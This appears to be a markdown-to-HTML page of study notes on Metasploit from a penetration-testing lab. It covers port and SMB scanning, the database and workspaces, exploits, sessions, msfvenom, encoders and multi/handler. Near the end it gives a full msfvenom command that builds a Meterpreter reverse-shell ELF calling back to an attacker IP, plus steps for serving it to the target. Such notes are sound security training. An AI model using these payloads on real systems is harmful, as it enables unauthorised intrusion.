@@ -1,0 +1,137 @@
+<h1 id="exploitation"><a aria-hidden="true" class="anchor-heading icon-link" href="#exploitation"></a>Exploitation</h1>
+<h1 id="tasks"><a aria-hidden="true" class="anchor-heading icon-link" href="#tasks"></a>Tasks</h1>
+<ul class="contains-task-list">
+<li class="task-list-item"><input type="checkbox" disabled> How to scan target systems using Metasploit.</li>
+<li class="task-list-item"><input type="checkbox" disabled> How to use the Metasploit database feature.</li>
+<li class="task-list-item"><input type="checkbox" disabled> How to use Metasploit to conduct a vulnerability scan.</li>
+<li class="task-list-item"><input type="checkbox" disabled> How to use Metasploit exploit vulnerable services on target systems.</li>
+<li class="task-list-item"><input type="checkbox" disabled> How <code>msfvenom</code> can be used to create payloads and obtain a Meterpreter session on the target system.</li>
+</ul>
+<h2 id="scanning"><a aria-hidden="true" class="anchor-heading icon-link" href="#scanning"></a>Scanning</h2>
+<h3 id="port-scanning"><a aria-hidden="true" class="anchor-heading icon-link" href="#port-scanning"></a>Port Scanning</h3>
+<p>Metasploit has many modules to scan open ports on the target system and network.</p>
+<ul>
+<li>List potential port scanning modules available using <code>search portscan</code> command.</li>
+</ul>
+<p>Options:</p>
+<ul>
+<li>
+<p><strong>CONCURRENCY</strong>
+: Number of targets to be scanned simultaneously.</p>
+</li>
+<li>
+<p><strong>PORTS</strong>
+: Port range to be scanned. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.</p>
+</li>
+<li>
+<p><strong>RHOSTS</strong>
+: Target or target network to be scanned.</p>
+</li>
+<li>
+<p><strong>THREADS</strong>
+: Number of threads that will be used simultaneously. More threads = faster scans.</p>
+</li>
+</ul>
+<h4 id="udp-service-identification"><a aria-hidden="true" class="anchor-heading icon-link" href="#udp-service-identification"></a>UDP Service Identification</h4>
+<p><code>scanner/discovery/udp_sweep</code> module will allow to quickly identify services running over the UDP (User Data Protocol).</p>
+<h4 id="smb-scans"><a aria-hidden="true" class="anchor-heading icon-link" href="#smb-scans"></a>SMB Scans</h4>
+<p>On a corporate network, <code>smb_enumshares</code> and <code>smb_version</code> to identify specific services on system.</p>
+<p>Metasploit has many modules that can help you have a better understanding of the target system and possibly help you find vulnerabilities. It is always worth performing a quick search to see if there are any modules that could be helpful based on your target system. </p>
+<p>[+] 10.10.192.91:         - 10.10.192.91:22 - TCP OPEN
+[+] 10.10.192.91:         - 10.10.192.91:21 - TCP OPEN
+[+] 10.10.192.91:         - 10.10.192.91:139 - TCP OPEN
+[+] 10.10.192.91:         - 10.10.192.91:445 - TCP OPEN
+[+] 10.10.192.91:         - 10.10.192.91:8000 - TCP OPEN
+[*] 10.10.192.91:         - Scanned 1 of 1 hosts (100% complete)</p>
+<h2 id="the-metasploit-database"><a aria-hidden="true" class="anchor-heading icon-link" href="#the-metasploit-database"></a>The Metasploit Database</h2>
+<p>Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.</p>
+<h3 id="starting-postgresql-and-msfconsole-database"><a aria-hidden="true" class="anchor-heading icon-link" href="#starting-postgresql-and-msfconsole-database"></a>Starting Postgresql and <code>msfconsole</code> Database</h3>
+<p>You will first need to start the PostgreSQL database, which Metasploit will use with the following command: </p>
+<p><code>systemctl start postgresql</code></p>
+<p>Then initialize Metasploit Database using the <code>msfdb init</code> command and <code>db_status</code> to check the status after launching msfconsole.</p>
+<h3 id="listing-workspaces"><a aria-hidden="true" class="anchor-heading icon-link" href="#listing-workspaces"></a>Listing Workspaces</h3>
+<p>The database feature allows to create workspaces to isolate different projects. List available workspaces using the <code>workspace</code> command.</p>
+<ul>
+<li>Can add a workspace using the <code>-a</code> parameter or delete a workspace with <code>-d</code> parameter.</li>
+</ul>
+<h3 id="changing-workspaces"><a aria-hidden="true" class="anchor-heading icon-link" href="#changing-workspaces"></a>Changing Workspaces</h3>
+<ul>
+<li>Switch between workspaces by typing <code>workspace</code> followed by the desired workspace name.</li>
+</ul>
+<h4 id="workspace-help"><a aria-hidden="true" class="anchor-heading icon-link" href="#workspace-help"></a>Workspace Help</h4>
+<ul>
+<li>Use <code>workspace -h</code> command to list available options for the <code>workspace</code> command.</li>
+</ul>
+<h4 id="database-backend-commands"><a aria-hidden="true" class="anchor-heading icon-link" href="#database-backend-commands"></a>Database Backend Commands</h4>
+<ul>
+<li>Once Metasploit is launched with a database, the <code>help</code> command will show the Database Backends Commands menu.</li>
+</ul>
+<h4 id="db_nmap-command"><a aria-hidden="true" class="anchor-heading icon-link" href="#db_nmap-command"></a>db_nmap Command</h4>
+<ul>
+<li>Running Nmap scan with <code>db_nmap</code> will save the results to the database.</li>
+</ul>
+<h4 id="hosts-and-services"><a aria-hidden="true" class="anchor-heading icon-link" href="#hosts-and-services"></a>Hosts and Services</h4>
+<ul>
+<li>Can reach information relevant to hosts and services running on target systems with the <code>hosts</code> and <code>services</code> commands.</li>
+</ul>
+<p>Once the host information is stored in the database, you can use the <code>hosts -R</code> command to add this value to the RHOSTS parameter.</p>
+<h3 id="vulnerability-scanning"><a aria-hidden="true" class="anchor-heading icon-link" href="#vulnerability-scanning"></a>Vulnerability Scanning</h3>
+<p>Metasploit allows to quickly identify some critical vulnerabilities that could be considered as "low hanging fruit". Usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow access.</p>
+<p><code>info</code> command for any module to have a better understanding of its use and purpose.</p>
+<h3 id="exploitation-1"><a aria-hidden="true" class="anchor-heading icon-link" href="#exploitation-1"></a>Exploitation</h3>
+<p>Metasploit is an exploitation framework and exploits are the most populated module category.</p>
+<ul>
+<li>Search for exploits using the <code>search</code> command.</li>
+<li>Obtain more information about the exploit using the <code>info</code> command.</li>
+<li>Launch the exploit using <code>exploit</code>.</li>
+</ul>
+<p>The process seems simple but a successful outcome depends on a thorough understanding of services running on a target system.</p>
+<h4 id="available-payloads"><a aria-hidden="true" class="anchor-heading icon-link" href="#available-payloads"></a>Available Payloads</h4>
+<p>Most of the exploits have a preset default payload.</p>
+<ul>
+<li>Can always use the <code>show payloads</code> command to list other commands for that specific exploit.</li>
+<li>Use <code>set payload</code> command to select payload of choice.</li>
+</ul>
+<h4 id="background"><a aria-hidden="true" class="anchor-heading icon-link" href="#background"></a>Background</h4>
+<p>Once a session is opened, <code>CTRL+Z</code> to background or abort it using <code>CTRL+C</code>.</p>
+<h4 id="working-with-sessions"><a aria-hidden="true" class="anchor-heading icon-link" href="#working-with-sessions"></a>Working with Sessions</h4>
+<p>The <code>sessions</code> command will list all active sessions.</p>
+<ul>
+<li>Interact with any existing session using the <code>sessions -i</code> command followed by the session ID.</li>
+</ul>
+<h2 id="msfvenom"><a aria-hidden="true" class="anchor-heading icon-link" href="#msfvenom"></a>Msfvenom</h2>
+<p>Replaces Msfpayload and Msfencode to generate payloads.</p>
+<ul>
+<li>Msfvenom will allow to access all payloads in the Metasploit framework.</li>
+<li>Msfvenom allows to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).</li>
+</ul>
+<h3 id="output-formats"><a aria-hidden="true" class="anchor-heading icon-link" href="#output-formats"></a>Output Formats</h3>
+<ul>
+<li>Can generate stand-alone payloads or get a usable raw format with <code>msfvenom --list formats</code>.</li>
+</ul>
+<h3 id="encoders"><a aria-hidden="true" class="anchor-heading icon-link" href="#encoders"></a>Encoders</h3>
+<p>Encoders do not aim to bypass antivirus installed on the target system. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shell code is better solution to the problem.</p>
+<ul>
+<li>Usage of encoding with <code>-e</code> parameter.</li>
+</ul>
+<h3 id="handlers"><a aria-hidden="true" class="anchor-heading icon-link" href="#handlers"></a>Handlers</h3>
+<p>Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload.</p>
+<ul>
+<li>The term commonly used to receive a connection from a target is "catching a shell". Reverse shells or Meterpreter callbacks generated in the MSFvenom payload can be easily caught using a handler.</li>
+<li>Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.</li>
+<li>Multi Handler to receive the incoming connections with <code>use exploit/multi/handler</code> command.</li>
+</ul>
+<h4 id="other-payloads"><a aria-hidden="true" class="anchor-heading icon-link" href="#other-payloads"></a>Other Payloads</h4>
+<p>Linux Executable and Linkable Format (elf)
+<code>msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.13.40.171 LPORT=4444 -f elf > rev_shell.elf</code></p>
+<p>Transfer to the target machine by starting a Python web serer on attacking machine with <code>python3 -m http.server 9000</code> command. Then use wget to download it to the target machine (Linux)</p>
+<h2 id="summary"><a aria-hidden="true" class="anchor-heading icon-link" href="#summary"></a>Summary</h2>
+<ul>
+<li>Database feature can help with penetration testing with multiple targets.</li>
+<li>Creation of stand-alone Meterpreter payloads.
+<ul>
+<li>Helpful in situations where we can upload a file to the target system or have the ability to download files to the target system.</li>
+</ul>
+</li>
+<li>Meterpreter is a powerful tool that offers a lot of features during the post-exploitation phase.</li>
+</ul>
